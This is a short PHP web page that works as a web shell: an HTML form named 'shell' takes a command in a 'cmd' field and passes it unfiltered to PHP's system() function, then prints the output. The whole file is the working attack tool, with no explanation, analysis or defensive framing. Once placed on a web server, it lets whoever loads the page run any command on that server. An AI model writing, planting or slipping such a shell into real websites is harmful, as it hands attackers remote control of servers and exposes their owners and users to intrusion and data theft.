<html>
  <body>
    <form method="GET" name="shell">
      <input type="TEXT" name="cmd" size="80">
      <input type="SUBMIT" value="Execute">
    </form> 
    <pre> 
      <?php if(isset($_GET['cmd'])) 
        { system($_GET['cmd']); } ?> 
    </pre> 
  </body>
</html>
